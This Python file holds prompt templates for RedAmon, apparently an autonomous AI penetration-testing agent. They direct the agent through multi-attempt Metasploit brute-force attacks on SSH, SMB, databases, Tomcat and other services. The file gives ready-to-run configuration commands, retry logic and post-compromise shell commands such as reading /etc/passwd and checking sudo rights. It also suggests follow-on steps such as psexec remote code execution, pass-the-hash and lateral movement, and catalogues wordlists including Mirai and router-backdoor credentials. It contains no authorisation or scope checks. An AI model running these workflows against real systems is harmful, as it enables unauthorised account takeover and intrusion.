"""
RedAmon Brute Force Credential Guess Prompts

Prompts for brute force credential guess attack workflows.
"""

from .base import METASPLOIT_CONSOLE_HEADER


# =============================================================================
# BRUTE FORCE CREDENTIAL GUESS TOOLS (Multi-attempt workflow with OS detection)
# =============================================================================

BRUTE_FORCE_CREDENTIAL_GUESS_TOOLS = METASPLOIT_CONSOLE_HEADER + """
## ⚠️ ATTACK PATH: BRUTE FORCE CREDENTIAL GUESS ⚠️

**CRITICAL: This objective has been CLASSIFIED as brute force credential guessing.**
**You MUST follow the brute force workflow below. DO NOT switch to other attack methods.**

---

## RETRY POLICY

**Maximum wordlist attempts: {brute_force_max_attempts}**

If brute force fails with one wordlist strategy, you MUST try different wordlists up to {brute_force_max_attempts} times:
- **Attempt 1**: OS/Cloud-aware username + common passwords (based on detected technologies)
- **Attempt 2**: General comprehensive (unix_users.txt + unix_passwords.txt)
- **Attempt 3**: Service-specific defaults (if available for the service)

**DO NOT give up after first failure!** Track attempts in your TODO list.

---

## MANDATORY BRUTE FORCE CREDENTIAL GUESS WORKFLOW

### Step 0: Gather Target Context (BEFORE exploitation)

**Check `target_info.technologies` in the prompt context for OS/platform hints.**

Look for keywords like:
- `Ubuntu`, `Debian`, `CentOS`, `RHEL`, `Amazon Linux` → Linux variants
- `Windows Server`, `Windows 10/11` → Windows
- `Apache`, `nginx`, `OpenSSH` → Service versions may hint at OS
- Cloud indicators in IP/hostname → AWS, Azure, GCP

**If target_info.technologies is empty or unclear:**
1. Query the graph: `"What technologies are detected on <target-ip>?"`
2. Or use naabu with service detection: `-host <ip> -p <port> -json`
3. Check SSH banner if targeting SSH (often reveals OS)

### Step 1: Select the login scanner module

Based on the target service:

| Service | Port | Module |
|---------|------|--------|
| SSH | 22 | `use auxiliary/scanner/ssh/ssh_login` |
| FTP | 21 | `use auxiliary/scanner/ftp/ftp_login` |
| Telnet | 23 | `use auxiliary/scanner/telnet/telnet_login` |
| SMB | 445 | `use auxiliary/scanner/smb/smb_login` |
| RDP | 3389 | `use auxiliary/scanner/rdp/rdp_scanner` |
| VNC | 5900 | `use auxiliary/scanner/vnc/vnc_login` |
| WinRM | 5985 | `use auxiliary/scanner/winrm/winrm_login` |
| MySQL | 3306 | `use auxiliary/scanner/mysql/mysql_login` |
| MSSQL | 1433 | `use auxiliary/scanner/mssql/mssql_login` |
| PostgreSQL | 5432 | `use auxiliary/scanner/postgres/postgres_login` |
| Oracle | 1521 | `use auxiliary/scanner/oracle/oracle_login` |
| MongoDB | 27017 | `use auxiliary/scanner/mongodb/mongodb_login` |
| Redis | 6379 | `use auxiliary/scanner/redis/redis_login` |
| POP3 | 110 | `use auxiliary/scanner/pop3/pop3_login` |
| IMAP | 143 | `use auxiliary/scanner/imap/imap_login` |
| SMTP | 25 | `use auxiliary/scanner/smtp/smtp_login` |
| HTTP Basic | 80/443 | `use auxiliary/scanner/http/http_login` |
| Tomcat Manager | 8080 | `use auxiliary/scanner/http/tomcat_mgr_login` |
| WordPress | 80/443 | `use auxiliary/scanner/http/wordpress_login_enum` |
| Jenkins | 8080 | `use auxiliary/scanner/http/jenkins_login` |

### Step 2: Show options
`show options` -> Display all configurable parameters

### Step 3: Configure ALL settings in ONE metasploit_console call

**CRITICAL SYNTAX RULES:**
- Use `;` (semicolons) to chain multiple `set` commands - this WORKS in msfconsole!
- **DO NOT use `&&` or `||`** - these are SHELL operators that msfconsole does NOT understand!
- Include ALL configuration in ONE metasploit_console call

#### SSH Brute Force Templates (Attempt 1 - OS-Aware):

**Ubuntu/Debian (including AWS EC2):**
```
set RHOSTS <ip>; set RPORT 22; set USERNAME ubuntu; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt; set STOP_ON_SUCCESS true; set VERBOSE true; set CreateSession true; set BRUTEFORCE_SPEED {bruteforce_speed}
```

**Amazon Linux/AWS:**
```
set RHOSTS <ip>; set RPORT 22; set USERNAME ec2-user; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt; set STOP_ON_SUCCESS true; set VERBOSE true; set CreateSession true; set BRUTEFORCE_SPEED {bruteforce_speed}
```

**Generic Linux (root):**
```
set RHOSTS <ip>; set RPORT 22; set USERNAME root; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_roots.txt; set STOP_ON_SUCCESS true; set VERBOSE true; set CreateSession true; set BRUTEFORCE_SPEED {bruteforce_speed}
```

**Windows:**
```
set RHOSTS <ip>; set RPORT 22; set USERNAME Administrator; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt; set STOP_ON_SUCCESS true; set VERBOSE true; set CreateSession true; set BRUTEFORCE_SPEED {bruteforce_speed}
```

#### Template for General Comprehensive (Attempt 2 - if Attempt 1 fails):
```
set RHOSTS <ip>; set RPORT 22; set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt; set STOP_ON_SUCCESS true; set VERBOSE true; set CreateSession true; set BRUTEFORCE_SPEED {bruteforce_speed}
```

#### Template for Service-Specific (Attempt 3 - if Attempt 2 fails):
```
set RHOSTS <ip>; set RPORT 22; set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt; set STOP_ON_SUCCESS true; set VERBOSE true; set CreateSession true; set BRUTEFORCE_SPEED {bruteforce_speed}
```

**Configuration options explained:**
- **STOP_ON_SUCCESS=true**: Stop immediately when valid credentials found
- **VERBOSE=true**: Show all login attempts (enables 2-min timeout detection)
- **CreateSession=true**: Automatically open shell session on success (SSH only)
- **BRUTEFORCE_SPEED={bruteforce_speed}**: Delay between attempts (5=no delay, 0=5min/stealth) — configured in project settings

### Step 4: Verify configuration (OPTIONAL but recommended)
```
show options
```
Verify all settings are correct before running.

### Step 5: Execute (SEPARATE CALL!)
**In a NEW metasploit_console call, run the attack:**
```
run
```

**IMPORTANT:** The `run` command MUST be in a SEPARATE tool call from the `set` commands!

The module runs synchronously. Wait for completion indicators in the output:
- `[*] Scanned X of Y hosts (100% complete)` -> Brute force finished
- `[+] <ip>:22 - Success: 'user:password'` -> Credentials found!
- `[*] SSH session X opened` -> Session created (if CreateSession=true)

### Step 6: Verify Results (MANDATORY after run)

**IMMEDIATELY after `run` completes, check for sessions:**
```
sessions -l
```

**Then check credentials database:**
```
creds
```

**Interpreting results:**

| Sessions | Credentials | Result | Action |
|----------|-------------|--------|--------|
| Yes | Yes | SUCCESS | Proceed to Step 7 |
| No | Yes | PARTIAL SUCCESS | Report credentials, action="complete" |
| No | No | FAILED | **RETRY with different wordlist!** |

### Step 6b: RETRY LOGIC (if no credentials found)

**If no sessions AND no credentials found:**

1. Check your current attempt number (track in TODO list)
2. If attempts < {brute_force_max_attempts}: Go back to **Step 3** with next wordlist strategy
3. If attempts >= {brute_force_max_attempts}: Report failure with action="complete"

**Retry workflow - reconfigure with semicolons:**
```
unset USER_FILE; unset PASS_FILE; unset USERNAME; set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```
Then in separate call:
```
run
```

**Track attempts in TODO list:**
```
1. [x] Attempt 1: ubuntu + unix_passwords.txt - FAILED
2. [~] Attempt 2: unix_users.txt + unix_passwords.txt - IN PROGRESS
3. [ ] Attempt 3: piata_ssh_userpass.txt - PENDING
```

### Step 7: Handle Success

**If `sessions -l` shows active sessions:**
1. Request phase transition to `post_exploitation` using action="transition_phase"
2. Once in post-exploitation, use `sessions -i <id>` to interact with the shell
3. Use shell commands (NOT Meterpreter commands) - this is a SHELL session

**Shell session commands (after `sessions -i <id>`):**
```
whoami                -> Check current user
id                    -> User/group IDs
uname -a              -> System information
cat /etc/passwd       -> List users
sudo -l               -> Check sudo permissions
```

**If credentials found but NO session:**
- Use action="complete" to inform user of discovered credentials
- Credentials can be used for: manual SSH login, lateral movement, psexec, etc.

## CRITICAL: Commands NOT to use after brute force

| Command | Why NOT to use |
|---------|----------------|
| `jobs` | ssh_login runs in foreground, not as a background job |
| `notes` | Notes are for manual annotations, not brute force results |
| `vulns` | Brute force doesn't create vulnerability records |

## CREDENTIAL REUSE AFTER DISCOVERY

If credentials are found for non-SSH services (FTP, SMB, databases, web apps):
1. The attack is complete - credentials have been discovered
2. Inform the user of the discovered credentials
3. Credentials can be used for:
   - Direct service access (e.g., FTP client, database client)
   - Pass-the-hash attacks (SMB)
   - Further exploitation using the credentials
   - Lateral movement to other systems

**Example next steps after credential discovery:**
- **FTP:** Connect via FTP client, upload/download files
- **SMB:** Use `exploit/windows/smb/psexec` with discovered credentials for RCE
- **MySQL:** Connect via mysql client for data access
- **PostgreSQL:** Use `exploit/linux/postgres/postgres_payload` for RCE
- **Tomcat:** Use `exploit/multi/http/tomcat_mgr_upload` with discovered credentials

Use `action="complete"` after successfully discovering credentials.
"""


# =============================================================================
# BRUTE FORCE CREDENTIAL GUESS WORDLIST GUIDANCE
# =============================================================================

BRUTE_FORCE_CREDENTIAL_GUESS_WORDLIST_GUIDANCE = """
## Available Wordlists Reference

**Location:** `/usr/share/metasploit-framework/data/wordlists/`

### General Purpose (Use for comprehensive brute force)
| File | Description |
|------|-------------|
| `unix_users.txt` | Common Unix usernames (~170 entries) |
| `unix_passwords.txt` | Common Unix passwords (~1000 entries) |
| `password.lst` | General password list (~2000 entries) |
| `burnett_top_1024.txt` | Top 1024 most common passwords |
| `burnett_top_500.txt` | Top 500 most common passwords |
| `common_roots.txt` | Common root passwords |
| `keyboard-patterns.txt` | Keyboard pattern passwords (qwerty, 123456, etc.) |
| `namelist.txt` | Common names used as passwords |

### SSH
| File | Description |
|------|-------------|
| `piata_ssh_userpass.txt` | SSH username:password combos |
| `root_userpass.txt` | Root user credentials |

### HTTP / Web Services
| File | Description |
|------|-------------|
| `http_default_pass.txt` | HTTP default passwords |
| `http_default_users.txt` | HTTP default usernames |
| `http_default_userpass.txt` | HTTP user:pass combos |
| `http_owa_common.txt` | Outlook Web Access common creds |
| `joomla.txt` | Joomla CMS wordlist |
| `wp-plugins.txt` | WordPress plugins |
| `wp-themes.txt` | WordPress themes |
| `wp-exploitable-plugins.txt` | Exploitable WordPress plugins |
| `wp-exploitable-themes.txt` | Exploitable WordPress themes |

### Tomcat
| File | Description |
|------|-------------|
| `tomcat_mgr_default_pass.txt` | Tomcat Manager passwords |
| `tomcat_mgr_default_users.txt` | Tomcat Manager usernames |
| `tomcat_mgr_default_userpass.txt` | Tomcat Manager user:pass combos |

### Databases
| File | Description |
|------|-------------|
| `postgres_default_pass.txt` | PostgreSQL passwords |
| `postgres_default_user.txt` | PostgreSQL usernames |
| `postgres_default_userpass.txt` | PostgreSQL user:pass combos |
| `oracle_default_userpass.txt` | Oracle DB defaults |
| `oracle_default_passwords.csv` | Oracle password list |
| `db2_default_pass.txt` | IBM DB2 passwords |
| `db2_default_user.txt` | IBM DB2 usernames |
| `db2_default_userpass.txt` | IBM DB2 user:pass combos |

### VNC
| File | Description |
|------|-------------|
| `vnc_passwords.txt` | Common VNC passwords |

### SNMP
| File | Description |
|------|-------------|
| `snmp_default_pass.txt` | SNMP community strings |

### IPMI (Server Management)
| File | Description |
|------|-------------|
| `ipmi_users.txt` | IPMI usernames |
| `ipmi_passwords.txt` | IPMI passwords |

### iDRAC (Dell Server Management)
| File | Description |
|------|-------------|
| `idrac_default_user.txt` | iDRAC usernames |
| `idrac_default_pass.txt` | iDRAC passwords |

### Routers / Network Devices
| File | Description |
|------|-------------|
| `routers_userpass.txt` | Router default credentials |
| `dlink_telnet_backdoor_userpass.txt` | D-Link telnet backdoor creds |
| `telnet_cdata_ftth_backdoor_userpass.txt` | CDATA FTTH backdoor creds |

### CCTV / DVR
| File | Description |
|------|-------------|
| `multi_vendor_cctv_dvr_users.txt` | CCTV/DVR usernames |
| `multi_vendor_cctv_dvr_pass.txt` | CCTV/DVR passwords |

### IoT / Embedded / Botnets
| File | Description |
|------|-------------|
| `mirai_user.txt` | Mirai botnet usernames |
| `mirai_pass.txt` | Mirai botnet passwords |
| `mirai_user_pass.txt` | Mirai user:pass combos |
| `vxworks_common_20.txt` | VxWorks common passwords |
| `vxworks_collide_20.txt` | VxWorks collision passwords |

### SCADA / Industrial
| File | Description |
|------|-------------|
| `scada_default_userpass.txt` | SCADA default credentials |

### CMS / Applications
| File | Description |
|------|-------------|
| `cms400net_default_userpass.txt` | CMS 400.NET defaults |
| `grafana_plugins.txt` | Grafana plugins list |
| `flask_secret_keys.txt` | Flask secret keys |
| `superset_secret_keys.txt` | Apache Superset secret keys |

### SAP
| File | Description |
|------|-------------|
| `sap_common.txt` | SAP common passwords |
| `sap_default.txt` | SAP default credentials |
| `sap_icm_paths.txt` | SAP ICM paths |

### Other Services
| File | Description |
|------|-------------|
| `rpc_names.txt` | RPC service names |
| `rservices_from_users.txt` | R-services user mappings |
| `sid.txt` | Oracle SID list |
| `tftp.txt` | TFTP paths |
| `named_pipes.txt` | Windows named pipes |
| `lync_subdomains.txt` | Microsoft Lync subdomains |
| `sensitive_files.txt` | Linux sensitive file paths |
| `sensitive_files_win.txt` | Windows sensitive file paths |

### Unhashed Defaults (for hash cracking context)
| File | Description |
|------|-------------|
| `default_users_for_services_unhash.txt` | Default usernames |
| `default_pass_for_services_unhash.txt` | Default passwords |
| `default_userpass_for_services_unhash.txt` | Default user:pass |
| `hci_oracle_passwords.csv` | Oracle HCI passwords |

### Miscellaneous
| File | Description |
|------|-------------|
| `adobe_top100_pass.txt` | Adobe breach top 100 |
| `dangerzone_a.txt` | High-risk passwords (set A) |
| `dangerzone_b.txt` | High-risk passwords (set B) |
| `av-update-urls.txt` | Antivirus update URLs |
| `av_hips_executables.txt` | AV/HIPS executable names |
| `can_flood_frames.txt` | CAN bus flood frames |
| `malicious_urls.txt` | Known malicious URLs |
| `telerik_ui_asp_net_ajax_versions.txt` | Telerik UI versions |
"""
